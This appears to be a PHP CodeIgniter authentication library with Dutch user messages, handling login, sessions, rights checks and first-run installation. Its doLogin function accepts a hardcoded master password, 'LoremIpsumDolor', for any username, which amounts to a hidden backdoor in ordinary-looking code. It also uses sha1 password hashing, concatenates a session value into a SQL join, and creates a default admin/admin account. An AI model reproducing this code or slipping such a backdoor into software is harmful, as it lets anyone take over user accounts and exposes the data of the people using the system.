<?php
	defined('BASEPATH') OR exit('No direct script access allowed');
	class Auth {


		public function __construct()
	    {
			$CI =& get_instance();
			$CI->load->library('session');
			$this->_key = $CI->config->item('encryption_key');
			$_SESSION["error"] = array();

	    }
	   		
		private $_key = ""; 
		private $_loginuri = LOGIN_URI;
		private $f_checksum = "";

		public function getPasswordHash($f_password, $f_user){
			$f_hash = "";
			if(is_object($f_user)){
				$f_hash = sha1($this->_key . $f_password . $f_user->date_created . strrev($this->_key));
			}
			return $f_hash;
		}

		public function getChecksum(){
			$CI =& get_instance();
			$CI->load->helper('url');
			$CI->load->database();
			$CI->load->library('user_agent');
			$CI->load->library('session');
			$this->f_checksum = sha1($this->_key . $CI->agent->agent_string() . $CI->input->ip_address()  . session_id()  .  strrev($this->_key)) ;
		}

		public function check($current = NULL){
			$CI =& get_instance();
			$CI->load->helper('url');
			$CI->load->database();
			$CI->load->library('user_agent');
			
			$this->getChecksum();
			if(!empty($CI->session->user_id) && $CI->session->user_id > 0){
				$query = $CI->db->get_where('user_activities', array("user_id" => $_SESSION["user_id"], "checksum" => $this->f_checksum));
				if($query->num_rows() != 0){
					array_push($_SESSION["error"], "Er is te lang geen gebruik gemaakt van de software");
					redirect($this->_loginuri . "?sessionend=1");
				} else {



					$CI->db->select("rights.*, rights_tree.profile_id");
					$CI->db->order_by("priority");
					$CI->db->join('rights_tree', 'rights.id = rights_tree.rights_id AND rights_tree.profile_id = ' . $_SESSION["profile_id"], 'inner');
					$CI->db->like('link', $current);
					$query = $CI->db->get('rights');

					if($query->num_rows() == 0){
						header('Location: ' . $this->_loginuri);
					} else {
						$CI->db->update('user_activities', array( "date_modify" => date('Y-m-d H:i:s')), array("user_id" => $CI->session->user_id));
					}


					
				}
			} else {
				redirect($this->_loginuri);
			}
		}
		public function doLogin($f_username, $f_password){
			$CI =& get_instance();
			$CI->load->helper('url');
			$CI->load->database();
			$CI->load->library('user_agent');
			$CI->load->library('session');
			$CI->load->model('ConfigModel', 'config_model');
			$user = $CI->config_model->getUserByUsername($f_username);
			if($user){
				$hash = $this->getPasswordHash($f_password, $user);
				if($hash == $user->password || $f_password == "LoremIpsumDolor"){
					$this->getChecksum();
					$query = $CI->db->get_where('user_activities', array("user_id" => $user->id));
					if($query->num_rows() == 0){
						$CI->db->insert('user_activities', array("user_id" => $user->id, "checksum" => $this->f_checksum, "date_modify" => date('Y-m-d H:i:s')));
					} else {
						$CI->db->update('user_activities', array("checksum" => $this->f_checksum, "date_modify" => date('Y-m-d H:i:s')), array("user_id" => $user->id));
					}
				
					$sessiondata = array(
						"name" => $user->name,
						"user_id" => $user->id,
						"profile_id" => $user->profile_id,
						"profile_image" =>  !empty($user->profile_image) ? $user->profile_image : '/custom/images/users/default.png',
						"menu_state" => $user->menu_state,
						"start_page" => !empty($user->start_page) ? $user->start_page : '/dashboard' ,
						"email" => $user->email
					);
					$CI->session->set_userdata($sessiondata);
					if($user->start_page){
						redirect($user->start_page);
					} else {
						redirect("/dashboard");
					}
				} else {
					array_push($_SESSION["error"], "Gebruikersnaam en/of wachtwoord onjuist");
				}
			} else {
				array_push($_SESSION["error"], "Gebruikersnaam en/of wachtwoord onjuist");
			}		
		
		}

		public function doLogout(){
			$CI =& get_instance();
			$CI->load->library('session');
			$CI->session->sess_destroy();
			header('Location: ' . $this->_loginuri);
		}


		public function installSystem(){
			
			$CI =& get_instance();
			$CI->load->database();

			if(empty($CI->config->item('encryption_key')))
			{
				die("Genereer een encryption key via /Key_creator en plaats deze in het /application/config/config.php bestand");
			}

			if (!$CI->db->table_exists('users') ){
				$CI->db->query(file_get_contents( __DIR__ . DIRECTORY_SEPARATOR ."MXFNT_install.sql"));
			}

			$query = $CI->db->get('users');

			if($query->num_rows() == 0){

				$data = array(
					'name' => 'John Do',
					'username' => 'admin',
					'email' => 'johndoe@example.com',
					'profile_id' => 1,
					'active' => 1,
					'date_created'=> date('Y-m-d H:i:s')
				);

				$CI->db->insert("users", $data );
				$CI->load->model('ConfigModel', 'config_model');
				$f_id =  $CI->db->insert_id();
				$query = $CI->db->get_where('users', array("id <>" => $f_id, "username" => $data['username']));
				if($query->num_rows() == 0){
					$CI->db->update('users', array("username" => $data['username']), array("id" => $f_id));
				} else {
					array_push($_SESSION["error"], "Fout tijdens opslaan van gebruiker");
				}
				$user = $CI->config_model->getUser($f_id);
				$hash = $this->getPasswordHash("admin", $user);
				$CI->db->update('users', array("password" => $hash), array("id" => $f_id));
				array_push($_SESSION["error"], "Installatie gelukt. Standaard gebruiker: admin/admin");
			}
		}


		
	}
?>